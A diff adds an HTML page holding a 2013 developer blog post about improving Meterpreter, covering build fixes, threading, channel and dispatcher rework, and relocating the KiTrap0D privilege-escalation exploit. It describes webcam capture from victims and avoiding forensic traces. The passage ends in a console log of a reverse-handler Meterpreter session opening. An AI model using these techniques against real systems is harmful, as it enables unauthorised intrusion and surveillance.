@@ -1,0 +1,1725 @@
+<!DOCTYPE html>
+<html>
+   <head>
+   <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>
+    
+    
+    3 Months of Meterpreter - OJ&#39;s Perspective
+    
+  </title>
+  <link rel="shortcut icon" href="/favicon.ico" />
+  
+     <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+    
+  <link rel="stylesheet" href="/css/bootstrap.min.css">
+  <link rel="stylesheet" href="/css/bootstrap-theme.min.css">
+
+  <script src="/js/jquery.min.js"></script>
+  <script src="/js/bootstrap.min.js"></script>
+  <script src="/js/holder.min.js" type='text/javascript'></script>
+  <link rel="stylesheet" href="/highlight/styles/github-gist.css">  
+  <link rel="stylesheet" href="/css/style.css">
+
+  <link rel="canonical" href="/posts/3-months-of-meterpreter/">
+  
+  <script src="/highlight/highlight.pack.js" type='text/javascript'></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/highlightjs-line-numbers.js/2.3.0/highlightjs-line-numbers.min.js"></script>
+  <script type="text/javascript">
+
+    $(document).ready(function() {
+    
+    hljs.initHighlightingOnLoad();
+    $('pre code').each(function(i, block) {
+    hljs.highlightBlock(block);
+    hljs.lineNumbersBlock(block);
+    });
+});
+  </script>
+   </head>
+   <body data-spy="scroll" data-target="#toc">
+     <header class="navbar navbar-default navbar-fixed-top" id="top" role="navigation">
+  <div class="container">
+    <div class="navbar-header">
+      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target=".bs-navbar-collapse">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a class="navbar-brand" href="/">OJ&#39;s Perspective</a>
+    </div>
+
+    
+    <nav class="collapse navbar-collapse bs-navbar-collapse" role="navigation">
+      <ul class="nav navbar-nav">
+	
+	
+	<li  ><a href="/">Home</a></li>
+	
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+	
+	<li > <a href="/streaming/" >Live Streaming</a></li>
+	
+
+	
+
+	
+	
+	<li > <a href="/about/" >About</a></li>
+	
+
+	
+	
+	<li > <a href="/contact/" >Contact</a></li>
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+      </ul>
+</nav>
+</header>
+
+     <div class="jumbotron masthead" role="main">
+       <div class="container">
+	 <div class="row">
+
+ 	   <div class="col-md-8 col-md-offset-2 ">
+	   
+<div class="panel panel-default">
+  <div class="panel-body">
+      <article id='post' >
+	<h1> 3 Months of Meterpreter </h1>
+	  
+	  <span class="text-muted">Posted by:&nbsp;Fri Dec 27, 2013</span>
+
+	  <p><img src="http://www.metasploit.com/revamp/images/metasploit-logo.png" style="float:right;margin-left:5px;margin-bottom:5px;"/>
+In August this year I was fortunate enough to land a three-month contract working with the awesome people at <a href="http://www.rapid7.com/">Rapid7</a>. The job: <em>make <a href="https://github.com/rapid7/meterpreter">Meterpreter</a> more awesome on Windows</em>. That&rsquo;s right <em>more</em> awesome than it already is. Tough gig, but what an amazing opportunity!</p>
+
+<p>Those three months have already come and gone, and what a ride it has been. In this post I would like to detail some of the work that has gone into Meterpreter, and Metasploit too, with a goal of helping others understand what it does and how it works. Ultimately, I&rsquo;d love to start seeing some contributions from the community now that it&rsquo;s <em>substantially</em> easier to build.</p>
+
+<p>So, in a semi-chronological-semi-ad-hoc order, here&rsquo;s how Meterpreter has evolved.</p>
+
+<h2 id="tl-dr">TL;DR</h2>
+
+<p>This post is long. So if you&rsquo;re keen to see a nice summary, you should go and read the <a href="https://community.rapid7.com/community/metasploit/blog/2013/12/27/meterpreter-reloaded">wicked post over at Security Street</a> which gives a great summary of what&rsquo;s in this post. Thanks to the rather classy <a href="https://twitter.com/todb">Tod Beardsley</a> for serving this baby up!</p>
+
+<h2 id="a-whole-new-build-environment">A Whole New Build Environment</h2>
+
+<p>Getting contributions from the Open Source community can be tricky enough, even when your build is clean and your development environment is very easy to get up and running. In the case of Meterpreter, <strong>neither</strong> of these things were true and hence anyone looking to contribute had to first negotiate the gauntlet of getting a functioning build environment configured.</p>
+
+<p>My first task was to fix these problems. The immediate goal was to update the source so that it could be built with <a href="http://www.visualstudio.com/downloads/download-visual-studio-vs#d-express-windows-desktop">Visual C++ Express edition</a>. The Express editions of Microsoft&rsquo;s tools are free to download and use, and hence it would enable those who don&rsquo;t have a paid version of Visual Studio to build Meterpreter.</p>
+
+<p>With that I embarked on the relatively simple job of updating projects, solutions and some areas of the source code. When I started this work, Visual Studio 2012 was the current version and hence that was the target to support. One of my first <a href="https://github.com/rapid7/meterpreter/pull/16">pull requests</a> to the Meterpreter repository was this upgrade, and thankfully it was very well received.</p>
+
+<p>Then in typical fashion, just a couple of weeks after this work, Microsoft decides to release Visual Studio 2013! At first I didn&rsquo;t consider going through the upgrade process, but soon after I thought it best that the effort was made to bring our toolset up to the bleeding edge and the rest of the team agreed. So no long after, a <a href="https://github.com/rapid7/meterpreter/pull/41">new pull request</a> was submitted that brought things up to the latest and greatest.</p>
+
+<h2 id="clean-command-line-builds">Clean Command Line Builds</h2>
+
+<p>When I first tackled the Meterpreter build I saw two things that were just a little off-putting:</p>
+
+<ol>
+<li>There was one component, <a href="https://github.com/rapid7/meterpreter/tree/master/workspace/ext_server_sniffer">ext_server_sniffer</a>, which wouldn&rsquo;t build out of the box because of a missing dependency. This dependency, the packet sniffer SDK, is one that&rsquo;s available to Rapid7 employees only, due to licensing restrictions on the code. With this dependency missing, the build would finish with errors.</li>
+<li>There were <em>lots</em> of warnings generated by the C++ compiler even when the build succeeded without errors. This was particularly bad in the case of the 64-bit build, for obvious reasons.</li>
+<li>There was no way of building everything from the command line; it had to be built from within Visual Studio. This meant that having the build run under the context of something like <a href="http://jenkins-ci.org/">Jenkins</a> wasn&rsquo;t possible.</li>
+</ol>
+
+<p>I wanted to see these things go away so that all future contributors would see <code>0</code> errors <em>and</em> <code>0</code> warnings when the build completed. Needless to say, removing all the warnings wasn&rsquo;t a task that could be done overnight, but the error was definitely one that could be done.</p>
+
+<p>I decided to solve the problem of the missing component by having different configurations baked into the projects. Meterpreter&rsquo;s solution contains the usual <code>Release</code> and <code>Debug</code> configurations that everyone is used to. It now also contains two new configurations called <code>r7_released</code> and <code>r7_debug</code>. The former two build all the projects <em>except</em> for the <code>ext_server_sniffer</code> extension, while the latter two include it. Anyone who works for Rapid7, that has access to the proprietary packet sniffer SDK, would be able to use the configurations prefixed with <code>r7_</code>. All other contributors would be able to use the configurations they&rsquo;re used to using. This does come with a little bit of confusion for the developer as they need to build with the correct configuration, but this is a small issue that can (and has) been fixed with documentation.</p>
+
+<p>On the plus side, the command line build script is in the fortunate position of being able to detect the presence of the dependencies and choose which configuration to run. This means that it never results in an error.</p>
+
+<p>So after a few weeks and lots of commits, I took the plunge and finalised the last of the issues with warnings, passed on a <a href="https://github.com/rapid7/meterpreter/pull/49">pull request</a> which the legendary <a href="https://twitter.com/_juan_vazquez_">Juan</a> landed, resulting in this &hellip;</p>
+
+<p><img src="https://github-camo.global.ssl.fastly.net/55f4e2cf4419f90a802acb0f3ac3b4d87476ff02/687474703a2f2f692e696d6775722e636f6d2f6b5852523176482e706e67" alt="Clean Builds" /></p>
+
+<p>Clean builds make for a happy OJ. And with that locked in, it was decided by the team that &ldquo;Treat warnings as errors&rdquo; would be turned on for each of the projetcs so that any future warnings would result in failed builds. This now helps us keep the build clean.</p>
+
+<p>With all this in place, we&rsquo;re also able to constantly run <a href="https://ci.metasploit.com/job/MeterpreterWin/">CI builds for Meterpreter</a> when commits are made to <code>master</code> and when pull requests come in. This is really helping us keep things clean and gives us much quicker feedback on what might be wrong with the source base.</p>
+
+<h2 id="bug-fixes">Bug Fixes</h2>
+
+<p>There are a few worthy mentions from the bug fix department that I&rsquo;d like to share with you.</p>
+
+<h3 id="64-bit-pointer-truncation">64-bit Pointer Truncation</h3>
+
+<p>In some scenarios, on a 64-bit version of Windows, migration of Meterpreter would sometimes result in the session terminating unexpectedly. This rather intimidating bug was the first I attempted to fix when I joined the project, and I documented the analysis and resolution <a href="http://buffered.io/posts/64bit-pointer-truncation-in-meterpreter/">in a previous blog post</a>, so if you&rsquo;re interested in the detail please have a read of that article. If you&rsquo;re too lazy, the TL;DR version is that 64-bit pointers were being truncated to 32-bit as a result of a bad function pointer type declaration. This wasn&rsquo;t an issue until recently because it appears that new versions of <a href="http://en.wikipedia.org/wiki/Address_space_layout_randomization">ASLR</a> have just started allocating above the 4GB boundary.</p>
+
+<h3 id="crashy-meterpreter-with-ms08-067">Crashy Meterpreter with MS08-067</h3>
+
+<p>Penetration testers all around the world have fallen in love with <a href="http://technet.microsoft.com/en-us/security/bulletin/ms08-067">MS08-067</a>, and rightly so. It has proved to be a very reliable exploit and has served the industry well. So imagine the dismay that some testers experienced when using the Meterpreter payload with this exploit on Windows XP (without any service packs) and seeing their session <strong>crash on startup</strong>. Horrible. The reason for this was due to Meterpreter attempting to enumerate NICs on the target box when first setting itself up. In Windows XP SP1 and onwards, certain parts of the Windows API had changed to allow for easier gathering of certain bits of information. Prior to this, it wasn&rsquo;t so easy. Bear in mind that Meterpreter doesn&rsquo;t really know anything about the system that it&rsquo;s running on so it attempts to figure it out as it goes. In this particular case it failed to properly detect the host operating system&rsquo;s capabilities and attempted to read invalid areas of memory. After much investigation, and a great deal of help from <a href="https://twitter.com/_juan_vazquez_">Juan</a> (again, who is legendary, I&rsquo;m not sure if I mentioned that), we <a href="https://github.com/rapid7/meterpreter/pull/21">landed a fix</a> for the problem, and there was much rejoicing.</p>
+
+<h3 id="multi-call-railgun-failures">Multi-call Railgun failures</h3>
+
+<p>The glory of <a href="http://www.room362.com/blog/2010/7/7/intro-to-railgun-win-api-for-meterpreter.html">Railgun</a> was slightly tarnished by a not-so-stable multi-call function which was causing crashes in Meterpreter sessions. A slight tweak of the code on both the <a href="https://github.com/rapid7/meterpreter/pull/28">Meterpreter side</a> and the <a href="https://github.com/rapid7/metasploit-framework/pull/2458">Metasploit side</a> resulted in this problem going away and allowing other modules to make better use of Railgun through a lower number of calls. Less chatty comms can only be a good thing.</p>
+
+<h3 id="sniffer-extension-fixes">Sniffer Extension Fixes</h3>
+
+<p>The <code>ext_server_sniffer</code> extension suffered from a bit of 64-bit hate. It had on a number of occasions crashed sessions under 64-bit and failed to run completely on newer versions of Windows. Some rework of the packet sniffer SDK, along with rebuilding binaries using the new toolchain, resulted in both of these problems disappearing.</p>
+
+<h3 id="deadly-webcam-snapshots">Deadly Webcam Snapshots</h3>
+
+<p>A much-loved feature of Meterpreter is it&rsquo;s ability to take a snapshots from an attached webcam and download them to the attacker&rsquo;s machine. This nifty feature could sometimes result in crashy sessions, and nobody likes crashy sessions.</p>
+
+<p>The reason this was happening was because of the way that webcam capture was implemented combined with the mechanism that Meterpreter uses to manage command execution. Each command that is executed in the context of Meterpreter is run on a separate thread. There are a few reasons for this which we won&rsquo;t go into now, but bear this mind while we dive into the webcam snapshot implementation.</p>
+
+<p><a href="https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/post/meterpreter/extensions/stdapi/webcam/webcam.rb">Webcam interaction</a> is controlled using three functions:</p>
+
+<ol>
+<li>Starting the webcam using <code>stdapi.webcam.webcam_start</code>.</li>
+<li>Capturing a frame from the webcam using <code>stdapi.webcam.webcam_get_frame</code>.</li>
+<li>Stopping the webcam using <code>stdapi.webcam.webcam_stop</code>.</li>
+</ol>
+
+<p>When the camera is &ldquo;started&rdquo;, Meterpreter fires up <a href="http://www.microsoft.com/com/default.mspx">COM</a> and uses a set of interfaces to manage camera initialisation and interaction. When the camera is stopped, these interface instances are destroyed and COM is shut down. The problem here is that COM needs to be initialised and shutdown <em>on the same thread</em>, and given that each command is executed on separate threads, COM got upset and sometimes died. The problem wasn&rsquo;t consistent, in that it worked on quite a few platforms and cameras, but not on others. I was only able to reproduce the problem with one camera on Vista x86.</p>
+
+<p>The <a href="https://github.com/rapid7/meterpreter/pull/44">solution</a> was simple: we now have a separate thread of execution that we use to do all the webcam-related work on. Since this fix has been put in place we haven&rsquo;t seen any more webcam-related crashes on Windows!</p>
+
+<h3 id="meterpreter-not-shutting-down">Meterpreter not Shutting Down</h3>
+
+<p>When Meterpreter is launched from an executable generated using <a href="http://www.offensive-security.com/metasploit-unleashed/Msfpayload">msfpayload</a>, the <code>exit</code> command would fail to actually terminate the process. This is obviously a bad thing as far as forensics goes, as leaving running processes behind leaves evidence of exploitation.</p>
+
+<p>This bug has been half fixed. That is, the <code>reverse_tcp</code> and <code>bind_tcp</code> payloads now exit cleanly, but the <code>reverse_http</code> and <code>reverse_https</code> payloads still need work (we <em>will</em> get them fixed though). Lots of work had to go into finding a cleaner shutdown process from within Meterpreter, and that is covered in the &ldquo;Engine Room Improvements&rdquo; section of this post. The rest falls under the category of &ldquo;how do we fix the payloads&rdquo;, which will have to come in a later post once we&rsquo;ve solved the issue.</p>
+
+<h3 id="unstable-channels">Unstable Channels</h3>
+
+<p>You might not know this, but every time you type <code>shell</code> into a Meterpreter prompt, you&rsquo;re opening a <em>channel</em>. When you download a file, you open a channel. Almost everything you do when you interact with Meterpreter results in a channel being opened. In some cases, such as when using <code>shell</code>, the channel persists for an extended period of time. Pressing <code>CTRL+Z</code> allows you to put such a channel into the background so that you can continue working with other Meterpreter features, after which you can bring the channel back into the foreground using the <code>channels</code> command.</p>
+
+<p>Well, that&rsquo;s how it was supposed to work, but this was broken on both Windows and POSIX builds of Metepreter. The work required to fix this was quite in-depth, and hence is covered in the &ldquo;Engine Room Improvements&rdquo; section of this post.</p>
+
+<h2 id="engine-room-improvements">Engine Room Improvements</h2>
+
+<p>Changes have come through in many forms from cosmetic to major heart surgery. This section covers some of the more gory details from the latter of these two categories.</p>
+
+<h3 id="improved-security">Improved Security</h3>
+
+<p>The last thing that we&rsquo;d like to have happen to a Meterpreter use is for them to be owned by the victim during an attack. While this might be rather implausible, we decided to run through the source and make a point of addressing any potentially risky function calls. Prime candidates for refactoring include functions such as <a href="http://www.cplusplus.com/reference/cstring/strcpy/">strcpy</a>, the <a href="http://en.wikipedia.org/wiki/Honey_Badger_Don't_Care">Honey Badger</a> of the C standard library. We cleaned up a great deal of those <a href="https://github.com/rapid7/meterpreter/pull/32">in a single pull request</a> and on the whole Meterpreter became <em>much</em> more trustworthy.</p>
+
+<h3 id="command-dispatcher-surgery">Command Dispatcher Surgery</h3>
+
+<p>The notion of a &ldquo;command&rdquo; won&rsquo;t be new to anyone who has used Meterpreter before. Simply, a command is the context of a single instance of execution. It can wrap up a simple request/response call, such as <code>getpid</code>, which allows for execution of commands on the victim&rsquo;s machine. No rocket science there.</p>
+
+<p>However, the implementation of the command mechanism had one limitation that forced a couple of issues to bubble to the surface:</p>
+
+<ol>
+<li>Every single command invoked in Meterpreter is executed on a separate thread. For the most part this is OK, and is what you want to have happen behind the scenes so that the main dispatcher thread doesn&rsquo;t block while waiting for potentially long-running commands to execute. However, there are times when the main dispatcher thread should be used instead.</li>
+<li>There was no clean way to tell the main dispatcher thread to stop processing commands, and so shutting down cleanly wasn&rsquo;t as simple job. Instead it required signalling of events across threads which caused some interesting bugs to appear, particularly in POSIX.</li>
+</ol>
+
+<p>Instead of attempting to debug the problems that we were seeing, I decided to get the scalpel out and rework the command handling so that there were two modes of operation instead of just the one. At first I thought this change would be quick, but I soon realised there was a bit more to it.</p>
+
+<p>The first thing I needed to do was to come up with a way of allowing individual commants to indicate whether they were to be executed on separate threads or not. At first I thought it&rsquo;d be useful to allow the attacker to tell Meterpreter on the fly, but I follow through with this idea because there&rsquo;s no only room for abuse, but the attacker isn&rsquo;t always the best judge of what should happen and on what thread it should happen on.</p>
+
+<p>Commands already have two pointers to functions which perform the handling of requests and responses. These pointers of a type called <code>DISPATCH_ROUTINE</code> which is declared as follows:</p>
+
+<pre><code class="language-cpp">typedef DWORD (*DISPATCH_ROUTINE)(Remote *remote, Packet *packet);
+</code></pre>
+
+<p>At first I felt that this would be easy to reuse for inline processing. However, after some thought, I went instead with the idea of an <code>INLINE_DISPATCH_ROUTINE</code> which has the following prototype:</p>
+
+<pre><code class="language-cpp">typedef BOOL (*INLINE_DISPATCH_ROUTINE)(Remote *remote, Packet *packet, DWORD* result);
+</code></pre>
+
+<p>The reasons I decided to do this are:</p>
+
+<ol>
+<li>It provides a definitive semantic separation of intent between something that&rsquo;s inline and something that is not.</li>
+<li>I wanted the prototype to be reflective of the difference in meaning to the caller.</li>
+<li>The inline dispatch routine needed to have a way of indicating to the calling thread that processing should cease or continue.</li>
+</ol>
+
+<p>The return value of the <code>INLINE_DISPATCH_ROUTINE</code> is a simple <code>BOOL</code> which says &ldquo;continue processing&rdquo; in the case of <code>TRUE</code> and &ldquo;stop processing&rdquo; in the case of <code>FALSE</code>. This simple return value makes it easy for the main dispatcher thread to check to see if a particular command has requested termination, as you can see from <a href="https://github.com/rapid7/meterpreter/blob/master/source/server/server_setup.c#L358">the updated body of the command dispatcher thread</a>. Having this in place meant that none of the commands required references to the server&rsquo;s state in order to have it terminated via a signal, and this itself preventing POSIX from segfaulting when exiting the process.</p>
+
+<p>Of course, this change wasn&rsquo;t something that could be added in easily due to the nature of <code>Command</code> declarations. Instead of making a point of changing each and every command so that it catered for this new <code>INLINE_DISPATCH_ROUTINE</code>, I thought it best to take a semi-<a href="http://en.wikipedia.org/wiki/Microsoft_Foundation_Class_Library">MFC</a>-style approach and produce some macros which better indicate the intent of commands when they are declared. This was made more important by the fact that each command was getting another member, and hence the declaration of each would have to change.</p>
+
+<p>Full details of these macros can be found in the <a href="https://github.com/rapid7/meterpreter/blob/master/source/common/base.h#L25">source code</a>, but to demonstrate the difference these make take a look at the difference between this:</p>
+
+<pre><code class="language-cpp">Command custom_commands[] = 
+{
+    { &quot;core_loadlib&quot;, 
+        { request_core_loadlib,              { 0 }, 0 },
+        { EMPTY_DISPATCH_HANDLER                      },
+    },
+
+    // Terminator
+    { NULL,
+        { EMPTY_DISPATCH_HANDLER                      },
+        { EMPTY_DISPATCH_HANDLER                      },
+    },
+};
+</code></pre>
+
+<p>and this:</p>
+
+<pre><code class="language-cpp">Command customCommands[] = 
+{
+    COMMAND_REQ(&quot;core_loadlib&quot;, request_core_loadlib),
+    COMMAND_TERMINATOR
+};
+</code></pre>
+
+<p>I hope you agree this does a better job of indicating intent and it also makes it harder to make mistakes, and it also hides the detail of implementation.</p>
+
+<p>With these changes in place, I was then able to change the two main shutdown functions so that they use this new functionality. The two commands that close Meterpreter sessions down are <code>exit</code> and <code>migrate</code>, so those were both changed:</p>
+
+<pre><code class="language-cpp">Command base_commands[] =
+{
+    // ... snip ...
+    // Migration
+    COMMAND_INLINE_REQ(&quot;core_migrate&quot;, remote_request_core_migrate),
+    // Shutdown
+    COMMAND_INLINE_REQ(&quot;core_shutdown&quot;, remote_request_core_shutdown),
+    // ... snip ...
+};
+</code></pre>
+
+<p>At this point Meterpreter shutdowns were more deterministic &hellip; at least for <code>reverse_tcp</code> payloads!</p>
+
+<p>If you&rsquo;re interested in taking a look at the guts of the rework you can see it in <a href="https://github.com/rapid7/meterpreter/pull/34">this pull request</a>.</p>
+
+<h3 id="channel-surgery">Channel Surgery</h3>
+
+<p>The core communication mechanism used by the internals of Meterpreter are called <em>channels</em>. A channel is a bit of an abstract concept, but effectively it&rsquo;s hard to do anything with Meterpreter without using one. If you execute a command from MSF to Meterpreter running on a victim&rsquo;s machine, you&rsquo;re using channels.</p>
+
+<p>As you can imagine, the thought of mucking with this beauties strikes fear into any sane person. It should, however, be obvious that I lost all my sanity thanks to years of enterprise software development, and so the thought of tweaking the innards of channels didn&rsquo;t faze me at all.</p>
+
+<p>A bug had been submitted to Redmine which indicated that in both Windows and POSIX Meterpreter was suffering from issues where channels were behaving incorrectly in various scenarios, including when put in the background. For the uninitiated, you can execute the <code>shell</code> command from within Meterpreter and end up with a native system shell; <code>/bin/bash</code> for POSIX and <code>cmd.exe</code> for Windows. You are then able to press <code>CTRL+Z</code> and MSF asks if you wish to background the channel, effectively putting it on ice while you do other things with Meterpreter (via other channels, HA!). To bring this channel back into the foreground, the <code>channels</code> command can be used with the <code>-i</code> switch. Another issue with this was that the processes running behind the backgrounded channels were left hanging, even when Meterpreter was closed. This obviously doesn&rsquo;t look good forensically.</p>
+
+<p>At least, that&rsquo;s how it was supposed to happen. But the fact of the matter was that backgrounded channels were broken. Bringing them back into the foreground never worked. Best case, the channel would close, and you&rsquo;d end up back at the Meterpreter shell. Worst case, the entire Meterpreter session would crash, which was what happened most of the time on POSIX.</p>
+
+<p>This was the issue that I was aiming to fix when I first started, and it turned out there were a few fundamental things that had to change to support it. To understand the problem, we need to take a look at the <code>scheduler</code> (cue the scary music). The <code>scheduler</code> is a bit of code that is responsible for managing the lifetime of channels (and a few other things) and for some reason the implementation for Windows was very different to POSIX, which to a point explained the differences we were seeing when testing.</p>
+
+<p>For this discussion, we&rsquo;ll stick to Windows and to the interactive channels which are responsible for dealing with shells. When an interactive channel is created that is tied to a background shell process a bunch of things happen:</p>
+
+<ol>
+<li>A process is created which contains the shell, in this case <code>cmd.exe</code>.</li>
+<li>Handles to <code>stdin</code> and <code>stdout</code> are acquired and stored alongside the channel.</li>
+<li>A thread is created and the work for that channel is tied to the thread.</li>
+<li>The scheduler is handed the detail of the channel so that the lifetime of the channel can be managed.</li>
+</ol>
+
+<p>A noteworthy exclusion to the captured metadata is the handle to the process being managed. As soon as the thread made it to the scheduler, the reference to the newly-created process was lost. At this point Meterpreter had no chance of correctly terminating processes automatically because it had no idea of which process to close. It might be able to be inferred in some cases, but it was impossible to infer in the general case.</p>
+
+<p>The first thing I did was fix this small issue so that at any time, Meterpreter knew which process was being managed by which thread and which channel. This made it possible to close down any associated process at the correct time, such as Meterpreter shutting down or when the user terminates a channel via the <code>channels -c</code> command.</p>
+
+<p>I then looked deeper into the scheduler&rsquo;s code and found that the management thread wasn&rsquo;t behaving as expected. Here&rsquo;s a summary of what it was doing:</p>
+
+<ol>
+<li>Extracting references to channel handles (which in our case would be the read handle for <code>stdout</code> and the thread&rsquo;s <code>sigterm</code> handle for when an external entity wanted to signal the closing of the channel).</li>
+<li>Waiting on each of those handles until a system event indicated that one of them has had some activity. Think [WaitForMultipleObjects][] in the Win32 API.</li>
+<li>When an event signal is received, the code would handle it, and either exit the loop if told to do so, or read data from the process&rsquo;s <code>stdout</code>.</li>
+<li>Rinse and repeat until close.</li>
+<li>On close, clean up all the thread context, the channel context, etc.</li>
+</ol>
+
+<p>In case it&rsquo;s not clear, there was something missing from this: there was no way to <em>suspend</em> the channel. When was happening when a channel was put in the background was that the loop was exited, and all the context was destroyed/closed. At this point it was not possible to bring it back.</p>
+
+<p>To fix this problem, I changed a bunch of things:</p>
+
+<ul>
+<li>Channel&rsquo;s had more <em>stuff</em> added to their context:
+
+<ul>
+<li>An event handle for <em>suspension</em> requests.</li>
+<li>An event handle for <em>resumption</em> requests.</li>
+</ul></li>
+<li>The scheduler thread loop waited on the suspension object as well as the original two.</li>
+<li>When channels were backgrounded, the calling code signalled the <em>suspenction</em> event and continued on it&rsquo;s merry way. The scheduler would simply block and wait on the <em>resumption</em> event <strong>only</strong>. No channel context is destroyed at this point like it was before.</li>
+<li>When the channel is to be brought into the foreground, the caller signals the <em>resumption</em> event and carries on as it did before. The scheduler receives this signal and then continues to wait, process and loop like it did before.</li>
+<li>If a channel is terminated while suspended, the caller signals resumption prior to termination, so this means that the channel&rsquo;s scheduler thread doesn&rsquo;t hang.</li>
+<li>When a channel is terminated, the process that is associated with the channel is also terminated.</li>
+</ul>
+
+<p>Once this work was done, I completely removed the old POSIX implementation and replaced it with this new one. It wasn&rsquo;t a smooth transition as I had to tweak a few other things, including the <a href="https://github.com/rapid7/meterpreter/pull/38/files#diff-9855cd942b30d41aeb1ac277daa18033R199">signalling code</a>. This was because on Windows we were using <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms682396%28v=vs.85%29.aspx">Event</a> objects that were auto-resetting, but POSIX wasn&rsquo;t behaving the same.</p>
+
+<p>There were a few other issues with regards to competing threads cleaning things up when they shouldn&rsquo;t resulting in some threads terminating horribly periodically. This was also adjusted so that the termination and tidying were a little more deterministic (yes, I <a href="https://www.youtube.com/watch?v=G2y8Sx4B2Sk">keep using that word</a>).</p>
+
+<p>The guts of the work can be found in <a href="https://github.com/rapid7/meterpreter/pull/38">this pull request</a>. There&rsquo;s actually not that much to it, but the nature of the changes were scary given that they messed with a pretty important part of the application.</p>
+
+<p>Thankfully, so far, it would seem that this really has improved things, and Meterpreter has been a lot more stable in both POSIX and Windows since this was rolled into <code>master</code>. Thanks again to <a href="https://twitter.com/egyp7">Egypt</a> for his testing and landing of this one.</p>
+
+<h2 id="local-exploits">Local exploits</h2>
+
+<p>I wish I could claim that I had built these myself, but that would be dishonest. The work that I did with local exploits involved refactoring and moving them around. I hope that some point soon I&rsquo;ll actually contribute a whole <em>new</em> exploit built by me from the ground up.</p>
+
+<h3 id="kitrap0d">KiTrap0D</h3>
+
+<p>This exploit is a gem from the mighty Tavis Ormandy, and was published in various places including the <a href="http://seclists.org/fulldisclosure/2010/Jan/341">Full Disclosure</a> mailing list a few years back.</p>
+
+<p>The <a href="http://carnal0wnage.attackresearch.com/2010/01/kitrap0d-now-in-metasploit.html">first version</a> of the KiTrap0D exploit made it into Metasploit in the form of a Meterpreter script that was run once a session had been established. Over time it changed and moved, then ended up in the <code>getsystem</code> command thanks to some work by <a href="https://twitter.com/stephenfewer">Stephen Fewer</a>.</p>
+
+<p>Many of us love <code>getsystem</code> and what it gives us, but not many of use really know how it works. Once Stephen had done his work, the <code>getsystem</code> command had <code>4</code> different methods in which to gain <code>SYSTEM</code> privileges. <code>3</code> of them were abusing various properties of Windows, and the last one (KiTrap0D) was an actual ring0 exploit. When <code>getsystem</code> is invoked without any parameters, Meterpreter loops through <em>all</em> of the existing methods to elevate and tries each one in order. It will keep trying until it either runs out of options, or one of the methods succeeds. The user can choose to use a single method by using the <code>-t</code> switch, but most of the time nobody bothers with that, as they don&rsquo;t really care which method works as long as they end up with elevated privileges.</p>
+
+<p>Unfortunately, on later versions of Windows, the first few methods of elevation don&rsquo;t have the hit-rate they have on earlier versions. As a result, the <code>getsystem</code> call manages to try the KiTrap0d exploit quite a bit more, and this sometimes resulted in either broken sessions. It had also been known to <a href="http://en.wikipedia.org/wiki/Blue_Screen_of_Death">blue-screen</a> boxes too, which isn&rsquo;t a great look at all, and it&rsquo;s frustrating for the testers.</p>
+
+<p>After discussing it with the team, it was decided that it should not be included as part of <code>getsystem</code> command, but instead be moved into a local exploit that can be invoked by the user if and when they want to.</p>
+
+<p>Both <a href="https://github.com/rapid7/meterpreter/pull/51">Meterpreter</a> and <a href="https://github.com/rapid7/metasploit-framework/pull/2633">Metasploit</a> needed to be updated to accommodate this, but the result is really nice. Here&rsquo;s a sample run of the new exploit:</p>
+
+<pre><code class="language-plain">msf exploit(handler) &gt; exploit
+
+[*] Started reverse handler on XX.XX.XX.40:8000 
+[*] Starting the payload handler...
+[*] Sending stage (785920 bytes) to XX.XX.XX.43
+[*] Meterpreter session 1 opened (XX.XX.XX.40:8000 -&gt; XX.XX.XX.43:49234) at 2013-11-27 19:55:43 +1000
+
+meterpreter &gt; getuid
+Server username: WIN-P73NLAJOYFH\OJ
+meterpreter &gt; background
